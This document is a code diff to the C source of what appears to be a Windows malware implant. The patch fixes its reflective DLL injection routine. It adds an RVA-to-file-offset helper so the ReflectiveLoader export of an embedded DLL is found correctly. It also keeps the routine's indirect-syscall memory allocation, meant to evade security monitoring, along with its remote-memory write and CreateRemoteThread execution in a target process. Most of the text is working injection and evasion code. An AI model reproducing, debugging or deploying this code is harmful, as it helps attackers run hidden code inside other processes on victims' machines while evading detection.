@@ -6,8 +6,7 @@
 #include <tlhelp32.h>
 #include <winternl.h>
 #include "evasion.h"
-#include "resource1.h"
-
+#include "../../resource.h"
 
 PVOID manual_procaddress(HMODULE hModule, const char* funcName);
 
@@ -32,6 +31,19 @@ typedef BOOL(WINAPI* pThread32First)    (HANDLE, LPTHREADENTRY32);
 typedef BOOL(WINAPI* pThread32Next)     (HANDLE, LPTHREADENTRY32);
 typedef BOOL(WINAPI* pCreateProcessW)   (LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
 typedef HMODULE(WINAPI* pLoadLibraryW)     (LPCWSTR);
+
+DWORD RvaToOffset(PVOID pDllBytes, DWORD rva) {
+    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pDllBytes;
+    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)pDllBytes + dos->e_lfanew);
+    IMAGE_SECTION_HEADER* section = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, section++) {
+        if (rva >= section->VirtualAddress &&
+            rva < section->VirtualAddress + section->Misc.VirtualSize) {
+            return rva - section->VirtualAddress + section->PointerToRawData;
+        }
+    }
+    return 0;
+}
 
 // ─── resolve helper — call once per function, pass k32 handle ────────────────
 #define RESOLVE(type, name, mod) type name = (type)manual_procaddress(mod, #name)
@@ -388,72 +400,56 @@ VOID thread_hijack(IMPLANT_CONFIG config) {
     ResumeThread(pi.hThread);
 }
 
-VOID reflective_inject(DWORD pid) {
-    printf("test2");
 
+VOID reflective_inject(DWORD pid) {
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
-    if (k32 == NULL) {
-        printf("k32 null");
-    }
     RESOLVE(pOpenProcess, OpenProcess, k32);
     RESOLVE(pCreateRemoteThread, CreateRemoteThread, k32);
     RESOLVE(pVirtualFreeEx, VirtualFreeEx, k32);
     RESOLVE(pWaitForSingleObject, WaitForSingleObject, k32);
     RESOLVE(pCloseHandle, CloseHandle, k32);
-
-
-    printf("test3");
-
     HANDLE remote_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (remote_proc != NULL) printf("[x] Opened handle to process\n");
     else { printf("[-] Failed to open handle to remote process\n"); return; }
-
-
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
     HGLOBAL hGlobal = LoadResource(NULL, hRes);
     PVOID pDllBytes = LockResource(hGlobal);
     DWORD dllSize = SizeofResource(NULL, hRes);
-
-    PVOID pLoader = manual_procaddress((HMODULE)pDllBytes, "ReflectiveLoader");
-
-
+    printf("[+] Embedded DLL size: %lu bytes\n", dllSize);
     PVOID base = NULL;
     SIZE_T allocSize = dllSize;
     g_ssn = getSSN("NtAllocateVirtualMemory");
     g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
-
-    NTSTATUS status = iNtAllocateVirtualMemory(remote_proc, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    NTSTATUS status = iNtAllocateVirtualMemory(remote_proc, &base, 0, &allocSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (status != 0) {
         printf("[-] Failed to allocate memory!\n");
+        CloseHandle(remote_proc);
         return;
     }
-    printf("Allocated memory at %p\n", base);
+    printf("[+] Allocated memory at %p\n", base);
     LPVOID inject_addr = base;
-
     SIZE_T bytesWritten = 0;
     g_ssn = getSSN("NtWriteVirtualMemory");
     g_syscall = getSyscallAddr("NtWriteVirtualMemory");
     iNtWriteVirtualMemory(remote_proc, inject_addr, pDllBytes, dllSize, &bytesWritten);
-
-    // Parse the export directory to get the RVA directly
     IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pDllBytes;
     IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)pDllBytes + dos->e_lfanew);
     DWORD exportRVA = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
-    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDllBytes + exportRVA);
-    DWORD* names = (DWORD*)((BYTE*)pDllBytes + exportDir->AddressOfNames);
-    DWORD* funcs = (DWORD*)((BYTE*)pDllBytes + exportDir->AddressOfFunctions);
-    WORD* ords = (WORD*)((BYTE*)pDllBytes + exportDir->AddressOfNameOrdinals);
-    
+    DWORD exportOffset = RvaToOffset(pDllBytes, exportRVA);
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)pDllBytes + exportOffset);
+    DWORD* names = (DWORD*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, exportDir->AddressOfNames));
+    DWORD* funcs = (DWORD*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, exportDir->AddressOfFunctions));
+    WORD* ords = (WORD*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, exportDir->AddressOfNameOrdinals));
+    printf("[+] Export count: %lu\n", exportDir->NumberOfNames);
     HANDLE thread_handle = NULL;
-    DWORD exportCount = exportDir->NumberOfNames;
-    printf("[+] Export count: %lu\n", exportCount);
-    for (DWORD i = 0; i < exportCount; i++) {
-        char* name = (char*)((BYTE*)pDllBytes + names[i]);
-        printf("[+] Export[%lu]: %s\n", i, name);
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        char* name = (char*)((BYTE*)pDllBytes + RvaToOffset(pDllBytes, names[i]));
         if (strcmp(name, "ReflectiveLoader") == 0) {
-            DWORD loaderOffset = funcs[ords[i]];
-            LPVOID reflectiveLoaderAddr = (LPVOID)((BYTE*)inject_addr + loaderOffset);
-            printf("[+] loaderOffset: 0x%X\n", loaderOffset);
+            DWORD loaderRVA = funcs[ords[i]];
+            DWORD loaderFileOffset = RvaToOffset(pDllBytes, loaderRVA);
+            LPVOID reflectiveLoaderAddr = (LPVOID)((BYTE*)inject_addr + loaderFileOffset);
+            printf("[+] loaderRVA: 0x%X loaderFileOffset: 0x%X\n", loaderRVA, loaderFileOffset);
             printf("[+] ReflectiveLoader at: %p\n", reflectiveLoaderAddr);
             thread_handle = CreateRemoteThread(remote_proc, NULL, 0,
                 (LPTHREAD_START_ROUTINE)reflectiveLoaderAddr, NULL, 0, NULL);
@@ -463,18 +459,18 @@ VOID reflective_inject(DWORD pid) {
             break;
         }
     }
-
     if (thread_handle != NULL) {
         printf("[x] Created remote thread\n");
         WaitForSingleObject(thread_handle, 5000);
         CloseHandle(thread_handle);
-        return;
     }
-    else printf("[-] Failed to create remote thread\n");
-    VirtualFreeEx(remote_proc, inject_addr, 0, MEM_RELEASE);
+    else {
+        printf("[-] Failed to create remote thread\n");
+        VirtualFreeEx(remote_proc, inject_addr, 0, MEM_RELEASE);
+    }
     CloseHandle(remote_proc);
-    return;
-
-
-
 }
+    
+
+
+    
